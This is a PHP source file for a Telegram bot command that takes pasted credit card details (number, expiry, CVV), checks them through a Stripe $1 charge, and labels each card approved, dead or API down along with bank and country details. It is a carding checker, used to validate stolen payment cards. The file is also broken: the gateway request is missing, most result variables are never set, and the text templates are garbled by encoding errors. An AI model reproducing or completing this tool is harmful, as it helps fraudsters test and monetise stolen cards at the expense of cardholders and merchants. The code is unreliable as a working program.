<?php

include __DIR__."/../config/config.php";
include __DIR__."/../config/variables.php";
include_once __DIR__."/../functions/bot.php";
include_once __DIR__."/../functions/db.php";
include_once __DIR__."/../functions/functions.php";

////////////====[MUTE]====////////////
if(strpos($message, "/pp ") === 0 || strpos($message, ".pp ") === 0){   
    $antispam = antispamCheck($userId);
    addUser($userId);
    
    if($antispam != False){
      bot('sendmessage',[
        'chat_id'=>$chat_id,
        'text'=>"[<u>ANTI SPAM</u>] Try again after <b>$antispam</b>s.",
        'parse_mode'=>'html',
        'reply_to_message_id'=> $message_id
      ]);
      return;

    }else{
        $messageidtoedit1 = bot('sendmessage',[
          'chat_id'=>$chat_id,
          'text'=>"<b>Wait for Result...</b>",
          'parse_mode'=>'html',
          'reply_to_message_id'=> $message_id

        ]);

        $messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');
        $lista = substr($message, 4);
        $bin = substr($cc, 0, 6);
        
        if(preg_match_all("/(\d{16})[\/\s:|]*?(\d\d)[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{3})/", $lista, $matches)) {
            $creditcard = $matches[0][0];
            $cc = multiexplode(array(":", "|", "/", " "), $creditcard)[0];
            $mes = multiexplode(array(":", "|", "/", " "), $creditcard)[1];
            $ano = multiexplode(array(":", "|", "/", " "), $creditcard)[2];
            $cvv = multiexplode(array(":", "|", "/", " "), $creditcard)[3];
            
            
            
            
            
if(strpos($result2, 'client_secret')) {
              addTotal();
              addUserTotal($userId);
              addCVV();
              addUserCVV($userId);
              addCCN();
              addUserCCN($userId);
              bot('editMessageText',[
                'chat_id'=>$chat_id,
                'message_id'=>$messageidtoedit,
                'text'=>"<b>Card:</b> <code>$lista</code>
<b>Status -Â» CVV or CCN âœ…
Response -Â» Approved
Gateway -Â» Stripe [CHARGE 1$] 
Time -Â» <b>$time</b><b>s</b>

------- Bin Info -------</b>
<b>Bank -Â»</b> $bank
<b>Brand -Â»</b> $schemename
<b>Type -Â»</b> $typename
<b>Currency -Â»</b> $currency
<b>Country -Â»</b> $cname ($emoji - ðŸ’²$currency)
<b>Issuers Contact -Â»</b> $phone
<b>----------------------------</b>

<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
<b>Bot By: <a href='https://t.me/r7bots'>R7BOTS 🇧🇩</a></b>",
                'parse_mode'=>'html',
                'disable_web_page_preview'=>'true'
                
            ]);}
            elseif($result2 == null && !$stripeerror) {
              addTotal();
              addUserTotal($userId);
              bot('editMessageText',[
                'chat_id'=>$chat_id,
                'message_id'=>$messageidtoedit,
                'text'=>"<b>Card:</b> <code>$lista</code>
<b>Status -Â» API Down âŒ
Response -Â» Unknown
Gateway -Â» Stripe [CHARGE 1$] 
Time -Â» <b>$time</b><b>s</b>

------- Bin Info -------</b>
<b>Bank -Â»</b> $bank
<b>Brand -Â»</b> $schemename
<b>Type -Â»</b> $typename
<b>Currency -Â»</b> $currency
<b>Country -Â»</b> $cname ($emoji - ðŸ’²$currency)
<b>Issuers Contact -Â»</b> $phone
<b>----------------------------</b>

<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
<b>Bot By: <a href='https://t.me/r7bots'>R7BOTS 🇧🇩</a></b>",
                'parse_mode'=>'html',
                'disable_web_page_preview'=>'true'
                
            ]);}
            else{
              addTotal();
              addUserTotal($userId);
              bot('editMessageText',[
                'chat_id'=>$chat_id,
                'message_id'=>$messageidtoedit,
                'text'=>"<b>Card:</b> <code>$lista</code>
<b>Status -Â» Dead âŒ
Response -Â» $errormessage
Gateway -Â» Stripe [CHARGE 1$]
Time -Â» <b>$time</b><b>s</b>

------- Bin Info -------</b>
<b>Bank -Â»</b> $bank
<b>Brand -Â»</b> $schemename
<b>Type -Â»</b> $typename
<b>Currency -Â»</b> $currency
<b>Country -Â»</b> $cname ($emoji - ðŸ’²$currency)
<b>Issuers Contact -Â»</b> $phone
<b>----------------------------</b>

<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
<b>Bot By: <a href='https://t.me/r7bots'>R7BOTS 🇧🇩</a></b>",
                'parse_mode'=>'html',
                'disable_web_page_preview'=>'true'
                
            ]);}
          
        }else{
          bot('editMessageText',[
              'chat_id'=>$chat_id,
              'message_id'=>$messageidtoedit,
              'text'=>"<b>Cool! Fucking provide a CC to Check!!</b>",
              'parse_mode'=>'html',
              'disable_web_page_preview'=>'true'
              
          ]);
      }
    }
}


?>